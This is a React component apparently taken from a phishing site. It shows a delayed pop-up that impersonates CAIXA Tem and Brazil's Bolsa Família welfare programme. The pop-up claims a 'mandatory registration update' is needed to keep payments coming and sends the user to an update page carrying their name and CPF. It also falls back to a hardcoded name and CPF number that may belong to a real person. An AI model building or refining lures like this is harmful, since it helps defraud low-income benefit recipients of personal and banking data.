import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { Lock } from 'lucide-react';

interface PopupBolsaFamiliaProps {
  nome?: string;
  cpf?: string;
}

export function PopupBolsaFamilia({ nome, cpf }: PopupBolsaFamiliaProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [, navigate] = useLocation();

  useEffect(() => {
    // Mostrar o popup após 2 segundos
    const timer = setTimeout(() => {
      setIsVisible(true);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleUpdateClick = () => {
    // Navegar para a página de atualização, passando nome e CPF como parâmetros
    if (nome && cpf) {
      navigate(`/atualizacao/${nome}/${cpf}`);
    } else {
      navigate('/atualizacao/edson/38176475572');
    }
  };

  if (!isVisible) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50 p-4">
      <div className="bg-white rounded-xl shadow-lg max-w-md w-full mx-auto overflow-hidden">
        {/* Ícone centralizado */}
        <div className="flex justify-center mt-6 mb-4">
          <div className="relative">
            <div className="bg-[#ffefd0] rounded-full w-20 h-20 flex items-center justify-center">
              <div className="text-[#e0984c] text-2xl">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM8 17.5C7.17 17.5 6.5 16.83 6.5 16C6.5 15.17 7.17 14.5 8 14.5C8.83 14.5 9.5 15.17 9.5 16C9.5 16.83 8.83 17.5 8 17.5ZM12 17.5C11.17 17.5 10.5 16.83 10.5 16C10.5 15.17 11.17 14.5 12 14.5C12.83 14.5 13.5 15.17 13.5 16C13.5 16.83 12.83 17.5 12 17.5ZM16 17.5C15.17 17.5 14.5 16.83 14.5 16C14.5 15.17 15.17 14.5 16 14.5C16.83 14.5 17.5 15.17 17.5 16C17.5 16.83 16.83 17.5 16 17.5ZM8 13.5C7.17 13.5 6.5 12.83 6.5 12C6.5 11.17 7.17 10.5 8 10.5C8.83 10.5 9.5 11.17 9.5 12C9.5 12.83 8.83 13.5 8 13.5ZM12 13.5C11.17 13.5 10.5 12.83 10.5 12C10.5 11.17 11.17 10.5 12 10.5C12.83 10.5 13.5 11.17 13.5 12C13.5 12.83 12.83 13.5 12 13.5ZM16 13.5C15.17 13.5 14.5 12.83 14.5 12C14.5 11.17 15.17 10.5 16 10.5C16.83 10.5 17.5 11.17 17.5 12C17.5 12.83 16.83 13.5 16 13.5ZM8 9.5C7.17 9.5 6.5 8.83 6.5 8C6.5 7.17 7.17 6.5 8 6.5C8.83 6.5 9.5 7.17 9.5 8C9.5 8.83 8.83 9.5 8 9.5ZM12 9.5C11.17 9.5 10.5 8.83 10.5 8C10.5 7.17 11.17 6.5 12 6.5C12.83 6.5 13.5 7.17 13.5 8C13.5 8.83 12.83 9.5 12 9.5ZM16 9.5C15.17 9.5 14.5 8.83 14.5 8C14.5 7.17 15.17 6.5 16 6.5C16.83 6.5 17.5 7.17 17.5 8C17.5 8.83 16.83 9.5 16 9.5Z" fill="#e8a551" />
                </svg>
              </div>
            </div>
            <div className="absolute bottom-0 right-0 bg-[#e8a551] rounded-full w-8 h-8 flex items-center justify-center">
              <Lock className="h-4 w-4 text-white" />
            </div>
          </div>
        </div>

        {/* Título */}
        <h2 className="text-[#333] text-2xl font-bold text-center mb-2">
          Regularização obrigatória do Bolsa Família
        </h2>

        {/* Descrição */}
        <p className="text-[#666] text-center px-6 mb-4">
          Para continuar recebendo o Bolsa Família normalmente você precisa atualizar seus dados no CAIXA Tem.
        </p>

        {/* Aviso Importante */}
        <div className="mx-6 mb-4 bg-[#fff2f2] border border-[#ffe6e6] rounded-md p-3">
          <p className="text-[#e05252] text-center text-sm">
            <span className="font-bold">AVISO IMPORTANTE:</span> Atualização cadastral obrigatória para manter o pagamento do Bolsa Família em dia.
          </p>
        </div>

        {/* Texto de instruções */}
        <div className="px-6 text-center text-[#888] text-sm mb-1">
          <p>Se você precisar, você pode procurar uma agência CAIXA.</p>
        </div>
        <div className="px-6 text-center text-[#888] text-sm mb-6">
          <p>Código: DOI 404</p>
        </div>

        {/* Botão */}
        <div className="px-6 pb-6">
          <button
            onClick={handleUpdateClick}
            className="w-full py-4 bg-[#f0a055] hover:bg-[#e8964a] text-white font-medium rounded-md transition-colors"
          >
            Atualizar meu cadastro agora
          </button>
        </div>
      </div>
    </div>
  );
}